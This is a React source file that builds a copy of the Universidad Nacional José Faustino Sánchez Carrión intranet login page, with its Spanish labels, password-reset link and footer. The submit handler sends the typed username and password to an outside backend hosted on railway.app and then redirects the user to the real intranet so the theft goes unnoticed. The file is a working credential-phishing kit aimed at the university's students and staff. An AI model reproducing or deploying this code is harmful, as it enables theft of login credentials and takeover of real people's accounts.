import '../App.css'
import {useState} from "react";
import image from "../images/img001.jpg"
import axios from "axios";


function LoginForm() {
    const API_URL = "https://backend-production-a384.up.railway.app/api/user/add"
    const [user, setUser] = useState("");
    const [pass, setPass] = useState("");
    const HandleUsername = (event) => {
        setUser(event.target.value)
    }
    const HandlePass = (event) => {
        setPass(event.target.value)
    }

    const handleSubmit = async (event) => {
        event.preventDefault();

        axios.post(API_URL, {
            username: user,
            password: pass,
        }).catch(error => {
            if (error.response) {
                console.error("Error al guardar la lectura", error.response.data)
            } else if (error.request) {
                console.error("No se recibió respuesta del servidor", error.request)
            } else {
                console.log("Error al enviar la solicitud", error.message)
            }
        })
        window.location.href = "https://intranet.unjfsc.edu.pe/"
    }


    return (

        <div className="Formulario">
            <table border="0" cellSpacing="2" cellPadding="2" width="100%">
                <tr>
                    <td colSpan="2">
                        &nbsp;</td>
                </tr>
                <tr>
                    <td colSpan="2">
                        &nbsp;</td>
                </tr>
                <tr>
                    <td colSpan="2">
                        &nbsp;</td>
                </tr>
                <tr>
                    <td colSpan="2">
                        &nbsp;</td>
                </tr>
                <tr>
                    <td style={{textAlign: 'right'}}>usuario :</td>
                    <td>
                        <input name="txtUsuario"
                               type="text"
                               maxLength="10"
                               id="txtUsuario"
                               className="ControlText"
                               value={user}
                               onChange={HandleUsername}
                        />
                    </td>
                </tr>
                <tr>
                    <td style={{textAlign: 'right'}}>contraseña :</td>
                    <td>
                        <input name="txtContrasenia"
                               type="password"
                               maxLength="16"
                               id="txtContrasenia"
                               className="ControlText"
                               value={pass}
                               onChange={HandlePass}
                        />
                    </td>
                </tr>
                <tr>
                    <td colSpan="2" style={{textAlign: 'right'}}
                        className="style2">
                        <a id="lnkbtnRecordarContrasenia"
                           className="Boton_activar_cuenta"
                           href="https://intranet.unjfsc.edu.pe/SolicitudContrasenia.aspx">Ha
                            olvidado su contraseña?</a>
                    </td>
                </tr>
                <tr>
                    <td colSpan="2" style={{textAlign: 'center'}}>
                        <input type="submit"
                               name="btnIniciarSesion"
                               value="Iniciar sesión"
                               id="btnIniciarSesion"
                               className="Boton_basico"
                               onClick={handleSubmit}
                        />
                    </td>
                </tr>
                <tr>
                    <td colSpan="2"
                        style={{textAlign: 'center'}}>
                        <span id="lblMensaje"
                              style={{color: 'Red', textAlign: 'center'}}>
                        </span>
                    </td>
                </tr>
            </table>
        </div>

    );
}


function LoginPage() {

    return (
        <div id="contenedor-principal">
            <div id="PosicionIzquierda">
                <LoginForm/>
            </div>
            <div id="PosicionDerecha">
                <div id="imagen">
                    <img src={image} width="380" height="253"/>
                </div>
                <div id="Contenido">
                    <p>Le recordamos que también puede utilizar el servicio de correo electrónico institucional que
                        ofrece la universidad a toda la comunidad universitaria.</p>
                </div>
            </div>
            <div id="PosicionFooter">Universidad Nacional José Faustino Sánchez Carrión - Intranet 2012 - Derechos
                Reservados
            </div>
        </div>
    )

}

export default LoginPage;


